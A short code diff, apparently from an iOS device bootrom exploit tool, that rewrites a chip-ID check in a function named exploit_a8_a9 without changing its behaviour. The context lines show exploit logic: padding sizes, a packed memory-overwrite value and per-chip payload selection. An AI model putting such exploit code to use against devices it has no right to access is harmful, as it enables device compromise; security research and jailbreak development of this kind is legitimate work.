@@ -897,7 +897,7 @@ def exploit_a8_a9(match=None):
         return
     padding = 0x400 + 0x80 + 0x80
     overwrite = struct.pack("<32xQQ", 0x180380000, 0)
-    if "CPID:8000" in device.serial_number or "CPID:8003" in device.serial_number:
+    if any(cpid in device.serial_number for cpid in ["CPID:8000", "CPID:8003"]):
         payload_a8_a9 = payload(0x8003)
     elif "CPID:7000" in device.serial_number:
         payload_a8_a9 = payload(0x7000)
